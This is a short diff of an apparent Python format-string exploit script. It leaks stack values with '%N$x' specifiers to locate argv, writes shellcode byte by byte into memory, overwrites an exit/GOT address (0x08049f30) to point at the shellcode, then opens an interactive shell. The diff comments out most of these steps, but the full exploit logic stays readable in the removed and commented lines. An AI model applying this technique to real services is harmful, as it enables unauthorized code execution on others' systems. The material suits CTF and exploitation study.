@@ -105,8 +105,8 @@ sys.stdout.write(line)
 #buf_start = vals.index('41414141')
 #print "buffer starts at %d" % buf_start
 
-index = buf_start + 64
-while True:
+#index = buf_start + 64
+#while True:
     s.send("%%%d$x %%%d$x\n" % (index, index + 1))
     line = readLine(s)
     vals = line.split()
@@ -116,23 +116,23 @@ while True:
         argv = v1
         break
     index += 1
-
-print "argv = %x" % argv
-
-idx = 0
-print "Writing: s=%s, argv=%x, idx=%d, buf_start=%d" % (s, argv, idx, buf_start)
-for b in sc:
-    writeByte(s, argv + idx, ord(b), buf_start)
-    #readLine(s)
-    idx += 1
-
-exit = 0x08049f30
-for i in range(4):
-    writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
+#
+#print "argv = %x" % argv
+#
+#idx = 0
+#print "Writing: s=%s, argv=%x, idx=%d, buf_start=%d" % (s, argv, idx, buf_start)
+#for b in sc:
+#   writeByte(s, argv + idx, ord(b), buf_start)
+#    #readLine(s)
+#    idx += 1
+#
+#exit = 0x08049f30
+#for i in range(4):
+#    writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
 #readLine(s)
 
-s.send('quit\n')
+#s.send('quit\n')
 
-l = Listener().start()
+#l = Listener().start()
 
-interact(s)
+#interact(s)
